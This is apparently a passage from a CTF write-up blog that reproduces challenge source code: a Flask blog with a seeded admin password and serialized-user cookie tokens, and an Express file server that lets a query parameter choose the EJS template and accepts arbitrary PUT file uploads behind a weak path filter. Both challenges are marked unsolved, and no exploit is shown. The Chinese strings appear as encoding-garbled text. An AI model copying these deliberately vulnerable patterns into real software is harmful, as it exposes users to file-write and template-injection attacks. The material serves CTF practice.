class="token punctuation">(</span>exception<span class="token punctuation">)</span><span class="token punctuation">:</span>    db <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> <span class="token string">'_database'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> db <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        db<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> app<span class="token punctuation">.</span>app_context<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        db <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>        db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''            CREATE TABLE IF NOT EXISTS users (                id INTEGER PRIMARY KEY AUTOINCREMENT,                username TEXT UNIQUE NOT NULL,                password TEXT NOT NULL,                is_admin INTEGER NOT NULL DEFAULT 0            )        '''</span><span class="token punctuation">)</span>        db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''            CREATE TABLE IF NOT EXISTS posts (                id INTEGER PRIMARY KEY AUTOINCREMENT,                title TEXT NOT NULL,                content TEXT NOT NULL,                created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP            )        '''</span><span class="token punctuation">)</span>        db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>                cursor <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT * FROM users WHERE username = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>                <span class="token string">'INSERT INTO users (username, password, is_admin) VALUES (?, ?, ?)'</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> generate_password_hash<span class="token punctuation">(</span><span class="token string">'aZPkAfnkXTm6UZKYPvhMWhRxnZENBRfB'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span>            db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>                <span class="token string">'INSERT INTO users (username, password, is_admin) VALUES (?, ?, ?)'</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span><span class="token string">'guest'</span><span class="token punctuation">,</span> generate_password_hash<span class="token punctuation">(</span><span class="token string">'guest'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span>            db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login_required</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">decorated_function</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        user <span class="token operator">=</span> get_current_user<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> user<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'è¯·å…ˆç™»å½•'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token keyword">not</span> user<span class="token punctuation">.</span>is_admin<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'æ‚¨æ²¡æœ‰æƒé™æ‰§è¡Œæ­¤æ“ä½œï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    decorated_function<span class="token punctuation">.</span>__name__ <span class="token operator">=</span> f<span class="token punctuation">.</span>__name__    <span class="token keyword">return</span> decorated_function<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># ä»æ•°æ®åº“è·å–æ‰€æœ‰æ–‡ç« </span>    posts <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT * FROM posts ORDER BY created_at DESC'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> posts<span class="token operator">=</span>posts<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/add'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">add_post</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        title <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span>        content <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> title <span class="token keyword">and</span> content<span class="token punctuation">:</span>            <span class="token comment"># å°†æ–‡ç« æ·»åŠ åˆ°æ•°æ®åº“</span>            db <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token comment"># æŸ¥æ‰¾æœ€å°çš„å¯ç”¨IDï¼ˆå¡«è¡¥å·²åˆ é™¤çš„IDç©ºç¼ºï¼‰</span>            cursor <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''                SELECT t1.id + 1 AS next_id                 FROM posts t1                 LEFT JOIN posts t2 ON t1.id + 1 = t2.id                 WHERE t2.id IS NULL                 ORDER BY t1.id                 LIMIT 1            '''</span><span class="token punctuation">)</span>            next_id <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token comment"># å¦‚æœæ²¡æœ‰ç©ºç¼ºçš„IDï¼Œä½¿ç”¨æœ€å¤§çš„ç°æœ‰ID+1</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> next_id<span class="token punctuation">:</span>                cursor <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT MAX(id) FROM posts'</span><span class="token punctuation">)</span>                max_id <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                next_id <span class="token operator">=</span> max_id <span class="token operator">+</span> <span class="token number">1</span> <span class="token keyword">if</span> max_id <span class="token keyword">else</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                next_id <span class="token operator">=</span> next_id<span class="token punctuation">[</span><span class="token string">'next_id'</span><span class="token punctuation">]</span>                        <span class="token comment"># ä½¿ç”¨æ‰¾åˆ°çš„IDæ’å…¥æ–°æ–‡ç« </span>            db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>                <span class="token string">'INSERT INTO posts (id, title, content) VALUES (?, ?, ?)'</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span>next_id<span class="token punctuation">,</span> title<span class="token punctuation">,</span> content<span class="token punctuation">)</span>            <span class="token punctuation">)</span>            db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>            flash<span class="token punctuation">(</span><span class="token string">'æ–‡ç« æ·»åŠ æˆåŠŸï¼'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'æ ‡é¢˜å’Œå†…å®¹ä¸èƒ½ä¸ºç©ºï¼'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'add_post.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/post/&lt;int:post_id>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view_post</span><span class="token punctuation">(</span>post_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    db <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    post <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT * FROM posts WHERE id = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>post_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> post<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'view_post.html'</span><span class="token punctuation">,</span> post<span class="token operator">=</span>post<span class="token punctuation">,</span> post_id<span class="token operator">=</span>post_id<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'æ–‡ç« ä¸å­˜åœ¨ï¼'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>                db <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT * FROM users WHERE username = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> user <span class="token keyword">and</span> check_password_hash<span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>            user_obj <span class="token operator">=</span> User<span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> user<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> user<span class="token punctuation">[</span><span class="token string">'is_admin'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>            user_hex <span class="token operator">=</span> user_obj<span class="token punctuation">.</span>serialize<span class="token punctuation">(</span><span class="token punctuation">)</span>            response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'Token'</span><span class="token punctuation">,</span> user_hex<span class="token punctuation">,</span> max_age<span class="token operator">=</span><span class="token number">86400</span><span class="token punctuation">,</span> httponly<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> secure<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>            flash<span class="token punctuation">(</span><span class="token string">'ç™»å½•æˆåŠŸï¼'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> response        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'Token'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> expires<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    flash<span class="token punctuation">(</span><span class="token string">'å·²æˆåŠŸç™»å‡ºï¼'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/delete/&lt;int:post_id>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">delete_post</span><span class="token punctuation">(</span>post_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    db <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    post <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT * FROM posts WHERE id = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>post_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> post<span class="token punctuation">:</span>        db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'DELETE FROM posts WHERE id = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>post_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'æ–‡ç« å·²æˆåŠŸåˆ é™¤ï¼'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'æ–‡ç« ä¸å­˜åœ¨ï¼'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    init_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="authwebï¼ˆUnsolvedï¼‰"><a href="#authwebï¼ˆUnsolvedï¼‰" class="headerlink" title="authwebï¼ˆUnsolvedï¼‰"></a>authwebï¼ˆUnsolvedï¼‰</h2><hr><h2 id="staticNodeServiceï¼ˆUnsolvedï¼‰"><a href="#staticNodeServiceï¼ˆUnsolvedï¼‰" class="headerlink" title="staticNodeServiceï¼ˆUnsolvedï¼‰"></a>staticNodeServiceï¼ˆUnsolvedï¼‰</h2><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>  <span class="token property">"ejs"</span><span class="token operator">:</span> <span class="token string">"^3.1.10"</span><span class="token punctuation">,</span>  <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.19.2"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>App.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> ejs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token number">3000</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">limit</span><span class="token operator">:</span> <span class="token string">'1mb'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">STATIC_DIR</span> <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// serve index for better viewing</span><span class="token keyword">function</span> <span class="token function">serveIndex</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> templ <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>templ <span class="token operator">||</span> <span class="token string">'index'</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> lsPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> req<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>templ<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">filenames</span><span class="token operator">:</span> fs<span class="token punctuation">.</span><span class="token function">readdirSync</span><span class="token punctuation">(</span>lsPath<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token literal-property property">path</span><span class="token operator">:</span> req<span class="token punctuation">.</span>path        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error rendering page'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// static serve for simply view/download</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token constant">STATIC_DIR</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Security middleware</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> req<span class="token punctuation">.</span>path <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span>             <span class="token punctuation">(</span><span class="token keyword">typeof</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>templ <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>templ <span class="token operator">!==</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error parsing path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">js$|\.\.</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Denied filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// logic middleware</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">serveIndex</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// Upload operation handler</span>app<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">'/*'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> filePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token constant">STATIC_DIR</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File already exists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    fs<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error writing file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">201</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File 